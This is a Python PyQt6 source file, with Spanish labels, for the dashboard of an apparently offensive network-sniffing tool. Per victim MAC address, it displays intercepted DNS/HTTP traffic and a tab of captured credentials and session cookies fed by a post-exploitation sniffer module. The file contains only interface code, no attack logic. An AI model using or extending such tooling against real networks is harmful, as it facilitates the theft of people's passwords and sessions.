import sys
from PyQt6.QtWidgets import (
    QDialog, QVBoxLayout, QHBoxLayout, QTableWidget, QTableWidgetItem,
    QHeaderView, QPushButton, QLabel, QTabWidget, QWidget, QTextEdit
)
from PyQt6.QtCore import Qt, pyqtSlot
from PyQt6.QtGui import QFont, QColor

class DashboardDialog(QDialog):
    def __init__(self, target_mac=None, parent=None):
        super().__init__(parent)
        self.target_mac = target_mac
        self.setWindowTitle("Dashboard Global" if not target_mac else f"Dashboard de Víctima: {target_mac}")
        self.setMinimumSize(950, 600)
        self.setStyleSheet("""
            QDialog { background: #0a0a0a; border: 2px solid #00aa44; border-radius: 8px; }
            QLabel { color: #00ff88; font-family: Monospace; font-weight: bold; font-size: 11pt; }
            QTableWidget { background: #051405; color: #ffffff; gridline-color: #333333; border: 1px solid #333333; font-family: Monospace; }
            QHeaderView::section { background-color: #0a2914; color: #00ff88; font-weight: bold; border: 1px solid #333333; padding: 5px; }
            QTabBar::tab { background: #0d2b0d; color: white; padding: 12px; font-weight: bold; font-family: Monospace; }
            QTabBar::tab:selected { background: #00aa44; color: black; }
            QPushButton { background: #00aa44; color: black; font-weight: bold; padding: 8px; border-radius: 4px; font-family: Monospace; }
            QPushButton:hover { background: #00ff88; }
        """)

        layout = QVBoxLayout(self)

        title = f"MONITOREO TÁCTICO {'GLOBAL' if not target_mac else 'INDIVIDUAL (' + target_mac + ')'}"
        header = QLabel(title)
        header.setStyleSheet("font-size: 14pt; margin-bottom: 10px; color: #ff3366;")
        layout.addWidget(header, alignment=Qt.AlignmentFlag.AlignCenter)

        self.tabs = QTabWidget()
        layout.addWidget(self.tabs)

        self.dns_table = self._build_table(["Hora", "MAC/IP", "Tipo", "Dominio/URL", "Detalles"])
        self.cred_table = self._build_table(["Hora", "MAC", "IP Destino", "Dato Crítico/Captura", "URL Origen"])

        self.tabs.addTab(self.dns_table, "Tráfico HTTP / DNS")
        self.tabs.addTab(self.cred_table, "⭐ Credenciales & Cookies")
        
        btn_layout = QHBoxLayout()
        close_btn = QPushButton("Cerrar Dashboard")
        close_btn.clicked.connect(self.accept)
        btn_layout.addStretch()
        btn_layout.addWidget(close_btn)
        layout.addLayout(btn_layout)

    def _build_table(self, headers):
        table = QTableWidget()
        table.setColumnCount(len(headers))
        table.setHorizontalHeaderLabels(headers)
        
        header = table.horizontalHeader()
        for i, h in enumerate(headers):
            if h in ["Hora", "MAC/IP", "MAC", "Tipo", "IP Destino"]:
                header.setSectionResizeMode(i, QHeaderView.ResizeMode.ResizeToContents)
            else:
                header.setSectionResizeMode(i, QHeaderView.ResizeMode.Stretch)

        table.verticalHeader().setVisible(False)
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setAlternatingRowColors(True)
        table.cellDoubleClicked.connect(lambda row, col: self._show_detail(table, row, col))
        return table

    def _show_detail(self, table, row, col):
        item = table.item(row, col)
        if not item: return

        detail_text = item.text()
        if not detail_text.strip(): return

        dlg = QDialog(self)
        dlg.setWindowTitle("Inspeccionar Registro")
        dlg.setMinimumSize(700, 400)
        
        # Heredar y adaptar el estilo para el popup
        dlg.setStyleSheet(self.styleSheet() + """
            QTextEdit { background: #051405; color: #00ff88; font-family: Monospace; font-size: 11pt; border: 1px solid #333333; padding: 10px; }
        """)

        layout = QVBoxLayout(dlg)

        header_item = table.horizontalHeaderItem(col)
        header_text = header_item.text() if header_item else "Detalle"
        title = QLabel(f"Información Completa - Columna: {header_text}")
        title.setStyleSheet("font-size: 12pt; color: #ffaa00; margin-bottom: 5px;")
        layout.addWidget(title)

        text_edit = QTextEdit()
        text_edit.setPlainText(detail_text)
        text_edit.setReadOnly(True)
        layout.addWidget(text_edit)

        close_btn = QPushButton("Cerrar")
        close_btn.clicked.connect(dlg.accept)
        layout.addWidget(close_btn, alignment=Qt.AlignmentFlag.AlignRight)

        dlg.exec()

    @pyqtSlot(object)
    def on_data_captured(self, data):
        # data es de tipo post_exploitation.sniffer.CapturedData
        if self.target_mac and self.target_mac.lower() != data.src_mac.lower():
            return

        hora = data.timestamp
        mac = data.src_mac or data.source_ip
        
        if data.data_type in ["DNS", "URL", "FORM"]:
            row = self.dns_table.rowCount()
            self.dns_table.insertRow(row)
            self.dns_table.setItem(row, 0, QTableWidgetItem(hora))
            self.dns_table.setItem(row, 1, QTableWidgetItem(mac))
            self.dns_table.setItem(row, 2, QTableWidgetItem(data.data_type))
            
            main_info = data.value if data.data_type == "DNS" else data.url
            extra_info = data.value if data.data_type != "DNS" else ""
            
            self.dns_table.setItem(row, 3, QTableWidgetItem(main_info))
            self.dns_table.setItem(row, 4, QTableWidgetItem(extra_info)) # No truncamos a 150 char, que lo vean entero en el popup
            
            # Auto scroll
            self.dns_table.scrollToBottom()

        elif data.data_type in ["CREDENTIAL", "COOKIE"]:
            row = self.cred_table.rowCount()
            self.cred_table.insertRow(row)
            self.cred_table.setItem(row, 0, QTableWidgetItem(hora))
            self.cred_table.setItem(row, 1, QTableWidgetItem(mac))
            self.cred_table.setItem(row, 2, QTableWidgetItem(data.dest_ip))
            
            val_item = QTableWidgetItem(data.value)
            val_item.setForeground(QColor("#ff0044")) 
            font = val_item.font()
            font.setBold(True)
            val_item.setFont(font)
            
            self.cred_table.setItem(row, 3, val_item)
            self.cred_table.setItem(row, 4, QTableWidgetItem(data.url))
            
            # Si hay credencial, cambiamos el foco a esta tab
            self.tabs.setCurrentIndex(1)
            self.cred_table.scrollToBottom()
